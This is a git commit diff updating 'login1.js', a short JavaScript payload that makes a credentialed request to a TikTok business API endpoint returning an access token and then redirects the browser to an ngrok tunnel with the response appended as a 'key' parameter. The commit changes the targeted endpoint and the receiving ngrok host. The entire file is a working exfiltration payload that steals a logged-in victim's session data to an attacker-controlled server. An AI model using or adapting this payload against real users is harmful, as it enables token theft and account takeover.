8fe5c727e8749601dbe22ee2885a864ea7f6c9fd
cancerz1990 <94399415+cancerz1990@users.noreply.github.com>
2023-09-05 01:12:37 +0700

    Update login1.js

--- login1.js
+++ login1.js
@@ -1,10 +1,10 @@
 var xhr = new XMLHttpRequest();
 xhr.onload = reqListener; 
-xhr.open("GET", "https://fp.us.tiktokv.com/tt-web/wallet/withdraw/home");
+xhr.open("GET", "https://business.tiktok.com/api/v2/bm/organization/feelgood/access_token/?attr_source=&source_biz_id=&attr_type=web&msToken=yilgIlrMA-vnHZDQITd05O9Fw_wnOYEfz1Ow0MMOoB9SwyExog3jZ9Ar1KUUgTZyi0fpx5gTaqK2QEsEor5IVaCT8V9IIW1uS2RcYs3_Xi99H9IL_KFJ&X-Bogus=DFSzKIVOblhANG1vtyBlnTO8kJMB&_signature=_02B4Z6wo00001uR.lIgAAIDD-DwqNlsNyiLkbpAAAN337a");
 xhr.withCredentials = true;
 xhr.setRequestHeader("Content-Type", "application/json");
 xhr.send(null);
 
 function reqListener() {
-    window.location='https://2d7a-140-213-103-229.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
+    window.location='https://e884-202-162-37-174.ngrok-free.app/?key='+encodeURIComponent(this.responseText); 
 };
